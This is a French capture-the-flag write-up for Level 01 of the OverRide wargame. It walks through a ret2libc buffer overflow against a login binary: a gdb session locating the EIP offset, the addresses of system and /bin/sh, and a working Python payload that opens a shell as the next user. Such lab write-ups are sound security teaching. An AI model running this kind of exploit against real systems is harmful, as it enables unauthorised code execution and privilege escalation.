# Level 01

```
(python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")') > /tmp/lvl1
```

## Solution :

On va utiliser un exploit ret to libc.

D'abord on peu voir que fgets peut cree un debordement de tampon, 2 fgets sont utiliser donc le premier attend dat_wil le second admin sauf que cela ne fait rien.
Comme le deuxieme fgets fait une taille de 100 mais que pass a une taille de 64 cela cree un debordement de tampon, voyons voir ce que cela ecrase :

```
gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers 
eax            0x1	1
ecx            0xffffffff	-1
edx            0xf7fd08b8	-134412104
ebx            0x33634132	862142770
esp            0xffffd710	0xffffd710
ebp            0x63413563	0x63413563
esi            0x0	0
edi            0x41346341	1093952321
eip            0x37634136	0x37634136
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 

```

eip est ecrasé, a 0x37634136 :

-   0x37634136 -> to_ascii -> 7cA6 
-   6Ac7 = 80 dans notre padding

Maintenant recuperont l'adresse de system et de /bin/sh pour cree notre payload 
```
System:
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>

/bin/sh:
(gdb) find &system,+9999999,"/bin/sh" 
0xf7f897ec
```

### Payload :

```
level01@OverRide:~$ (python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")') > /tmp/lvl1

level01@OverRide:~$ cat /tmp/lvl1 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
```